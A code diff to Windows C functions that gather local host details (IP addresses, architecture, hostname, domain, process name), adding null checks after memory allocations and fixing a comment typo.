@@ -14,19 +14,16 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 	LPVOID lpMsgBuf;
 
 	pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, sizeof(MIB_IPADDRTABLE));
-	if (pIPAddrTable)
+	if (!pIPAddrTable)
+		return NULL;
+
+	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
 	{
-		if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
-		{
-			LocalFree(pIPAddrTable);
-			pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, dwSize);
-		}
-		if (pIPAddrTable == NULL)
+		LocalFree(pIPAddrTable);
+		pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, dwSize);
+		if (!pIPAddrTable)
 			return NULL;
 	}
-
-	else
-		return NULL;
 
 	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
 		return NULL;
@@ -35,6 +32,8 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 	
 
 	UINT32* tableOfIPs = (UINT32*)LocalAlloc(LPTR, (*numberOfIPs) * sizeof(UINT32));
+	if (!tableOfIPs)
+		return NULL;
 	for (UINT32 i = 0; i < *numberOfIPs; i++)
 	{
 		IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[i].dwAddr;
@@ -63,7 +62,7 @@ BYTE getArch()
 	return 0x86;
 }
 
-// Getting the cujrent hostname
+// Getting the current hostname
 PCHAR getHostname()
 {
 	LPSTR data = NULL;
@@ -110,6 +109,8 @@ LPWSTR getDomain()
 	{
 		DWORD length = lstrlenW(pBuf->wki102_langroup);
 		domain = (PWCHAR)LocalAlloc(LPTR, sizeof(WCHAR) * length);
+		if (!domain)
+			return NULL;
 		memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length);
 	}
 	if (pBuf != NULL)
@@ -136,6 +137,8 @@ char* getCurrentProcName()
 		if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
 		{
 			processName = (char*)LocalAlloc(LPTR, buffSize + 1);
+			if (!processName)
+				return NULL;
 			memcpy(processName, buffer, buffSize);
 		}
 		CloseHandle(handle);
